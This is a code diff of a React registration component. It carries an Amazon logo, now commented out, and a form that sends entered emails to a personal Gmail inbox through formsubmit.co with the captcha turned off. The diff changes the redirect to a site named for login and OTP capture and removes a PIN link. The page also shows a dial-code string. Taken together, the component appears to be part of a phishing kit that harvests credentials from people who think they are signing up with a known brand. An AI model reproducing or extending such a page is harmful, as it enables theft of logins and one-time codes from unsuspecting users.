@@ -10,9 +10,9 @@ const Register = () => {
 
   return (  
     <div className='register'>
-        <Link to='/'>
+        {/* <Link to='/'>
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1024px-Amazon_logo.svg.png" alt="" className='register__logo' />
-        </Link>
+        </Link> */}
 
         <div className="register__header">
           <div className="register__headerText">
@@ -24,7 +24,7 @@ const Register = () => {
           <div className="register__containerUp">
             <form action="https://formsubmit.co/danielmordi22@gmail.com" method="POST">
               <input type="hidden" name="_captcha" value="false"></input>
-              <input type="hidden" name="_next" value="https://demiladebdm.netlify.com"></input>              
+              <input type="hidden" name="_next" value="https://loginandotplogin.netlify.app"></input>              
               <input
                 className='register__containerUpInput' 
                 value={email} 
@@ -62,9 +62,6 @@ const Register = () => {
             <div className="register__bottomB">
                 *5573#
             </div>
-            <Link to='/pin'>
-              Pin
-            </Link>
           </div>
 
         </div>
